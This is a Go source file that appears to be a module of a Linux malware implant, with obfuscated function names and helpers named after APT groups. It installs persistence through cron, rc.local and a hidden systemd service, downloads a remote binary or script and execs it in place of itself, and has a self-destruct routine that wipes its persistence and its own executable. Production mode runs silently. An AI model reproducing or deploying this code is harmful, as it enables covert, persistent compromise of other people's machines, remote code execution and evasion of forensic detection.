package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
)


func bNkXqVm() {
	exe, err := os.Executable()
	if err != nil {
		if verboseLog {
			deoxys("[DEBUG] Failed to get executable path: %v", err)
		}
		return
	}

	procName := filepath.Base(exe)
	cronJob := fmt.Sprintf("%s pgrep -x %s > /dev/null || %s > /dev/null 2>&1 &", schedExpr, procName, exe)

	if verboseLog {
		deoxys("[DEBUG] Would set up cron persistence")
		deoxys("[DEBUG] Executable: %s", exe)
		deoxys("[DEBUG] Process name: %s", procName)
		deoxys("[DEBUG] Would install cron job: %s", cronJob)
		deoxys("[DEBUG] Skipping actual execution (debug mode)")
		return
	}

	checkCmd := exec.Command(crontabBin, "-l")
	existing, _ := checkCmd.Output()
	if strings.Contains(string(existing), exe) {
		return
	}

	cmd := exec.Command(bashBin, shellFlag, fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronJob))
	if err := cmd.Run(); err != nil {
		deoxys("crontab install failed: %v", err)
	}
}

func hRpCwZt() {
	if verboseLog {
		deoxys("[DEBUG] Would set up rc.local persistence")
		if _, err := os.Stat(rcTarget); err != nil {
			deoxys("[DEBUG] %s does not exist, would skip", rcTarget)
			return
		}
		exe, err := os.Executable()
		if err != nil {
			deoxys("[DEBUG] Failed to get executable path: %v", err)
			return
		}
		b, err := os.ReadFile(rcTarget)
		if err != nil {
			deoxys("[DEBUG] Failed to read %s: %v", rcTarget, err)
			return
		}
		if strings.Contains(string(b), exe) {
			deoxys("[DEBUG] Entry already exists in rc.local")
			return
		}
		line := exe + " # " + kimsuky()
		deoxys("[DEBUG] Would add to rc.local: %s", line)
		deoxys("[DEBUG] Skipping actual execution (debug mode)")
		return
	}

	// Production mode - execute silently
	if _, err := os.Stat(rcTarget); err != nil {
		return
	}
	exe, err := os.Executable()
	if err != nil {
		return
	}
	b, err := os.ReadFile(rcTarget)
	if err != nil {
		return
	}
	if strings.Contains(string(b), exe) {
		return
	}
	line := exe + " # " + kimsuky() + "\n"
	sandworm(rcTarget, line, 0700)
}

func jGdBsLn(url string) ([]byte, error) {
	code, body, err := rawHTTPGet(url, nil, 30*time.Second)
	if err != nil {
		return nil, err
	}
	if code != 200 {
		return nil, fmt.Errorf("HTTP %d", code)
	}
	return body, nil
}

func fVxMqKp(url string) {
	programPath := filepath.Join(storeDir, binLabel)

	if verboseLog {
		deoxys("[DEBUG] Would set up persistence")
		deoxys("[DEBUG] Would create hidden directory: %s", storeDir)
		deoxys("[DEBUG] Primary: copy running binary")
		if url != "" {
			deoxys("[DEBUG] Fallback (if binary unreadable): fetch from %s", url)
		}
		deoxys("[DEBUG] Would write binary to: %s", programPath)
		deoxys("[DEBUG] Would write systemd service to: %s", unitPath)
		deoxys("[DEBUG] Would enable systemd service: %s", unitName)
		deoxys("[DEBUG] Skipping actual execution (debug mode)")
		return
	}

	os.MkdirAll(storeDir, 0755)

	// Always try to copy the running binary first.
	// Only fall back to the URL if the binary can't be read.
	var data []byte
	if exe, err := os.Executable(); err == nil {
		data, err = os.ReadFile(exe)
		if err != nil {
			deoxys("self-read failed: %v", err)
		}
	}
	if len(data) == 0 {
		if url == "" {
			deoxys("no binary and no fallback url — aborting")
			return
		}
		var err error
		data, err = jGdBsLn(url)
		if err != nil {
			deoxys("fallback fetch failed: %v", err)
			return
		}
		deoxys("used fallback url: %s", url)
	}

	if err := os.WriteFile(programPath, data, 0755); err != nil {
		return
	}

	unitContent := fmt.Sprintf(
		"[Unit]\nDescription=%s\nAfter=network.target\n\n[Service]\nExecStart=%s\nRestart=always\nRestartSec=30\n\n[Install]\nWantedBy=multi-user.target\n",
		binLabel, programPath,
	)
	os.WriteFile(unitPath, []byte(unitContent), 0644)

	cmd := exec.Command(systemctlBin, "enable", "--now", unitName)
	if err := cmd.Run(); err != nil {
		deoxys("systemctl enable failed: %v", err)
	}
}

func cTwHnYz(url string) {
	data, err := jGdBsLn(url)
	if err != nil {
		deoxys("fetch failed: %v", err)
		return
	}

	tmp, err := os.CreateTemp("", binLabel+"-*")
	if err != nil {
		return
	}
	tmpPath := tmp.Name()
	if _, err := tmp.Write(data); err != nil {
		tmp.Close()
		os.Remove(tmpPath)
		return
	}
	tmp.Close()
	os.Chmod(tmpPath, 0755)

	isScript := strings.HasSuffix(url, ".sh") ||
		(len(data) >= 2 && data[0] == '#' && data[1] == '!')

	var execPath string
	var args []string
	if isScript {
		execPath = bashBin
		args = []string{bashBin, tmpPath}
	} else {
		execPath = tmpPath
		args = []string{tmpPath}
	}

	// Replace this process — no return on success
	syscall.Exec(execPath, args, syscall.Environ())
	// Exec failed — clean up temp file
	os.Remove(tmpPath)
}

func rZbQfGv() {
	deoxys("removing all persistence and self-destructing")

	// 1. Stop and remove systemd service
	exec.Command(systemctlBin, "stop", unitName).Run()
	exec.Command(systemctlBin, "disable", unitName).Run()
	os.Remove(unitPath)
	exec.Command(systemctlBin, "daemon-reload").Run()

	// 2. Remove cron entries referencing our script or binary
	if out, err := exec.Command(crontabBin, "-l").Output(); err == nil {
		lines := strings.Split(string(out), "\n")
		var clean []string
		for _, line := range lines {
			if strings.Contains(line, binLabel) {
				continue
			}
			clean = append(clean, line)
		}
		filtered := strings.TrimSpace(strings.Join(clean, "\n"))
		if filtered == "" {
			exec.Command(crontabBin, "-r").Run()
		} else {
			cmd := exec.Command(crontabBin, "-")
			cmd.Stdin = strings.NewReader(filtered + "\n")
			cmd.Run()
		}
	}

	// 3. Clean rc.local
	rcLocal := rcTarget
	if data, err := os.ReadFile(rcLocal); err == nil {
		lines := strings.Split(string(data), "\n")
		var clean []string
		for _, line := range lines {
			if strings.Contains(line, binLabel) || strings.Contains(line, storeDir) {
				continue
			}
			clean = append(clean, line)
		}
		os.WriteFile(rcLocal, []byte(strings.Join(clean, "\n")), 0755)
	}

	// 4. Remove hidden directory (contains script + binary copy)
	os.RemoveAll(storeDir)

	// 5. Remove instance lock file
	os.Remove(lockLoc)

	// 6. Remove own executable
	if exe, err := os.Executable(); err == nil {
		os.Remove(exe)
	}

	os.Exit(0)
}
